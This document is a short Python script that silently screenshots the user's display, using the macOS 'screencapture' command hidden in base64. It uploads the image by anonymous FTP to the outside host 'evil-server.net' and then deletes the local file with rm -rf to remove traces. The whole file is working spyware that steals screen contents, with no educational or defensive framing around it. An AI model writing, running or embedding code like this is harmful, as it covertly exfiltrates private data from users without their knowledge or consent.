import sys, subprocess, base64, random, string
from ftplib import FTP

def getimg(path):
    captureout = subprocess.check_output([base64.b64decode(b'c2NyZWVuY2FwdHVyZQ==').decode(), '-x', '/tmp/' + path + '.png'])
    if 'could not create image from display ' in captureout:
        sys.exit()
def exfiltrate(path):
    ftp = FTP('evil-server.net')
    ftp.login()
    with open('/tmp/' + path + '.png', 'rb') as o:
        ftp.storbinary(f"STOR screenshot.png", o)
        o.close()
    ftp.quit()
    subprocess.check_output(['rm','-rf','/tmp/' + path + '.png'])   

namea=[]
for i in range(1,10):
    namea.append(random.choice(string.ascii_letters))
name = ''.join(namea)

getimg(name)
exfiltrate(name)
